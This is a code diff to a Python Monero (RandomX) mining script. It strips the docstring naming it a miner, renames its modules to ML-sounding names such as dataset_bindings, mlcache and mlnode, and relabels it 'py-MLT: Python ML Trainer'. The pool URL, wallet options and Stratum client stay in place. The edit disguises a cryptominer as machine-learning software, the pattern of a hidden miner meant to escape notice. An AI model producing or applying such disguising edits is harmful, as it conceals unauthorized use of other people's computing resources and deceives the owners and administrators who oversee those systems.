@@ -1,14 +1,5 @@
 #!/usr/bin/env python3
-"""
-pyrx-miner — High-performance Python Monero miner.
-Uses ctypes bindings to librandomx for native-speed RandomX hashing.
-Supports 1 GB hugepages, xmrig config.json, and multi-threaded mining.
 
-Usage:
-    python miner.py                       # uses ./config.json
-    python miner.py --config /path/to/config.json
-    python miner.py --threads 8 --url pool:port --user wallet
-"""
 import argparse
 import logging
 import os
@@ -19,13 +10,13 @@ import threading
 import time
 
 from config import MinerConfig
-from rx_bindings import (
+from dataset_bindings import (
     RandomX, RandomXError,
     RANDOMX_FLAG_DEFAULT, RANDOMX_FLAG_LARGE_PAGES,
     RANDOMX_FLAG_HARD_AES, RANDOMX_FLAG_FULL_MEM, RANDOMX_FLAG_JIT,
 )
-from hugepages import check_hugepages, try_setup_hugepages, print_hugepage_status
-from stratum import StratumClient
+from mlcache import check_hugepages, try_setup_hugepages, print_hugepage_status
+from mlnode import StratumClient
 from worker import WorkerManager
 
 log = logging.getLogger("pyrx")
@@ -137,8 +128,8 @@ def format_hashrate(h: float) -> str:
 
 
 def main():
-    parser = argparse.ArgumentParser(description="pyrx-miner: Python RandomX Monero Miner")
-    parser.add_argument("--config", "-c", default="config.json", help="Path to xmrig config.json")
+    parser = argparse.ArgumentParser(description="py-MLT: Python ML Trainer")
+    parser.add_argument("--config", "-c", default="dataset-config.json", help="Path to xmrig config.json")
     parser.add_argument("--url", help="Pool URL (overrides config)")
     parser.add_argument("--user", help="Wallet/login (overrides config)")
     parser.add_argument("--pass", dest="password", help="Password (overrides config)")
